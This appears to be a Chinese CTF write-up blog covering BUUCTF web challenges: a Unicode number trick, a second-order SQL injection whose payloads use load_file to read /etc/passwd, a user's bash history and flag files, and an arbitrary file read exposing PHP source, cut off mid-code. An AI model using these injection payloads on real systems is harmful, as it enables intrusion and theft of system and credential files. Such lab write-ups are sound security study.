<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p><strong>考点：unicode转换安全</strong></p>
<p>这个点确实没细看过。这次整理一下。</p>
<p>简单来看，Unicode的安全问题分为</p>
<p><strong>视觉欺骗</strong>：视觉问题一般指几个不同的不同的字符在某个字体下看起来较为相同。可能是字符之间一对一相似、多个字符的组合字符和一个字符相似等。</p>
<p>具体分类参考：</p>
<p><strong>非视觉漏洞</strong>：这些问题主要字符是转换导致的字符串。</p>
<blockquote>
<p>这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。举例来说，a 和ａ(\uff41)在某些字体下看起来可能相同，15和⑮(\u246e)其表示的数学意义可能相同，</p>
</blockquote>
<p>参考：</p>
<p>回到题目，是个独角兽商店。看这意思就是想让你把最贵那个买下来。</p>
<p>可以看见输入1337后它提示只允许输入一个字符。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207170443087.png" srcset="/img/loading.gif" alt="image-20201207170443087"></p>
<p>那么在网站<a href="https://www.compart.com/en/unicode/里找到一个值大于1337的字符就可以了。我选择了下面这个字符。" target="_blank" rel="noopener">https://www.compart.com/en/unicode/里找到一个值大于1337的字符就可以了。我选择了下面这个字符。</a></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207170751695.png" srcset="/img/loading.gif" alt="image-20201207170751695"></p>
<p>输入后得到flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207170844549.png" srcset="/img/loading.gif" alt="image-20201207170844549"></p>
<h1 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h1><p><strong>考点：二次注入</strong></p>
<p>进去是个留言板。想随便提交点东西进去结果要你先登录。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207173518227.png" srcset="/img/loading.gif" alt="image-20201207173518227"></p>
<p>看这意思那就先爆破一下密码：zhangwei666</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207183926137.png" srcset="/img/loading.gif" alt="image-20201207183926137"></p>
<p>顺便扫了一下，诶，git泄露。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207184254128.png" srcset="/img/loading.gif" alt="image-20201207184254128"></p>
<p>结果就这一个文件，看起来也没啥用。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">include</span> <span class="token string">"mysql.php"</span><span class="token punctuation">;</span>

<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>

<span class="token keyword">case</span> <span class="token string">'write'</span><span class="token punctuation">:</span>

  <span class="token keyword">break</span><span class="token punctuation">;</span>

<span class="token keyword">case</span> <span class="token string">'comment'</span><span class="token punctuation">:</span>

  <span class="token keyword">break</span><span class="token punctuation">;</span>

<span class="token keyword">default</span><span class="token punctuation">:</span>

  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">else</span><span class="token punctuation">{</span>

  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token delimiter">?></span></code></pre>
<p>控制台这看到</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207184919010.png" srcset="/img/loading.gif" alt="image-20201207184919010"></p>
<p>又回githack恢复</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207205744610.png" srcset="/img/loading.gif" alt="image-20201207205744610"></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207210021449.png" srcset="/img/loading.gif" alt="image-20201207210021449"></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">"mysql.php"</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">case</span> <span class="token string">'write'</span><span class="token punctuation">:</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into board
            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>
                title <span class="token operator">=</span> <span class="token string">'$title'</span><span class="token punctuation">,</span>
                content <span class="token operator">=</span> <span class="token string">'$content'</span>"<span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">case</span> <span class="token string">'comment'</span><span class="token punctuation">:</span>
    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select category from board where id='$bo_id'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into comment
            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>
                content <span class="token operator">=</span> <span class="token string">'$content'</span><span class="token punctuation">,</span>
                bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./comment.php?id=$bo_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">default</span><span class="token punctuation">:</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>大概率二次注入，参数除了有转义以外没有其他过滤。</p>
<p>可以看到两个case里都存在$category这个参数，write里的是用户post传入，而comment里的是从数据库取出来的。</p>
<p>case write:</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> "insert into board
        set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>
            title <span class="token operator">=</span> <span class="token string">'$title'</span><span class="token punctuation">,</span>
            content <span class="token operator">=</span> <span class="token string">'$content'</span>"<span class="token punctuation">;</span></code></pre>
<p>case comment:</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select category from board where id='$bo_id'"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> "insert into comment
        set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>
            content <span class="token operator">=</span> <span class="token string">'$content'</span><span class="token punctuation">,</span>
            bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>尽管write中插入数据时做了转义，但实际上存入数据库里的数据是并没有被转义的。因此write时存入一个$category，如</p>
<pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，<span class="token operator">/</span><span class="token operator">*</span></code></pre>
<p>同时comment中存入一个$content,如</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">*</span><span class="token operator">/</span><span class="token shell-comment comment">#</span></code></pre>
<p>当comment执行insert语句时就会造成二次注入。</p>
<pre class=" language-php"><code class="language-php">insert into comment
       set category <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，<span class="token comment" spellcheck="true">/*',
           content = '*/</span><span class="token shell-comment comment">#',</span>
           bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span></code></pre>
<p>综上，就可以构造语句找flag文件了。</p>
<p>（找文件的思路还要再学学 o.o</p>
<p>etc/passwd</p>
<pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201208134544946.png" srcset="/img/loading.gif" alt="image-20201208134544946"></p>
<p>看到www用了bash登录，查看bash_history</p>
<pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/home/www/.bash_history"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span> </code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201208135140457.png" srcset="/img/loading.gif" alt="image-20201208135140457"></p>
<p>删除了.DS_Store,那大概就是要找到他了。(hex显示完整文件)，解出来得到flag_8946e1ff1ee3e40f.php</p>
<pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/tmp/html/.DS_Store"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201208140034925.png" srcset="/img/loading.gif" alt="image-20201208140034925"></p>
<pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/tmp/html/flag_8946e1ff1ee3e40f.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre>
<p>得到flag,但是不对，啊这..</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201208140259192.png" srcset="/img/loading.gif" alt="image-20201208140259192"></p>
<p>想起来还有一个/var下的,得到正确flag。</p>
<pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/flag_8946e1ff1ee3e40f.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201208140520735.png" srcset="/img/loading.gif" alt="image-20201208140520735"></p>
<h1 id="CISCN-2019-华北赛区-Day1-Web-Web1"><a href="#CISCN-2019-华北赛区-Day1-Web-Web1" class="headerlink" title="CISCN-2019-华北赛区-Day1-Web-Web1"></a>CISCN-2019-华北赛区-Day1-Web-Web1</h1><p>首先是个登录注册界面，不考虑其他的先随便注册一个登进去看看。</p>
<p>进入之后是一个上传文件，简单传了几个文件发现并没有做很严格的限制；除此之外上传的文件还有下载和删除功能；上传、下载、删除都分别抓了下包，发现在下载界面的download.php这里存在任意文件读取，依次读取以下源码：</p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//class.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>
<span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>
<span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>
<span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"dropbox"</span><span class="token punctuation">;</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
